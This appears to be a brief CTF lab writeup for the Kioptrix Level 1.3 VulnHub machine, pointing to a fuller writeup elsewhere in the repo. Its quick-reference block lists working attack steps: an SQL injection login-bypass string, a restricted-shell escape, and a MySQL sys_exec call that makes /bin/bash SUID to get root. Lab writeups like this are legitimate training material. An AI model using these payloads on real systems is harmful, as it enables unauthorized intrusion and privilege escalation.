# Kioptrix: Level 1.3 (#4) — Writeup

> **Note:** This VM (Kioptrix Level 1.3, VulnHub entry #4) uses the same attack chain as
> [Kioptrix: Level 1.3](../kioptrix-4/README.md) already documented in this repo. The two
> VulnHub listings refer to the same machine. See `kioptrix-4/` for the complete writeup.

| | |
|-|-|
| **Target IP** | 192.168.56.X (host-only) |
| **Difficulty** | Easy |
| **OS** | Linux |
| **Root Flag** | Congrats.txt in /root |
| **Source** | [VulnHub](https://www.vulnhub.com/entry/kioptrix-level-13-4,25/) |
| **Duplicate of** | [kioptrix-4](../kioptrix-4/README.md) |

## Attack Summary

SQLi login bypass → lshell escape → MySQL `sys_exec()` UDF → SUID `/bin/bash` → root

## Quick Reference (see kioptrix-4/ for full commands)

```bash
# 1. SQLi login bypass
# Username: ' or 1=1 --
# Password: anything

# 2. Escape lshell
echo os.system('/bin/bash')

# 3. MySQL UDF privesc
mysql -u root
SELECT sys_exec('chmod u+s /bin/bash');
/bin/bash -p
id  # uid=0(root)
```

## Techniques

- SQL injection (authentication bypass)
- Restricted shell escape (`lshell` → bash)
- MySQL `sys_exec()` UDF for privilege escalation
- SUID bash shell

See [kioptrix-4/README.md](../kioptrix-4/README.md) for full step-by-step walkthrough with screenshots.
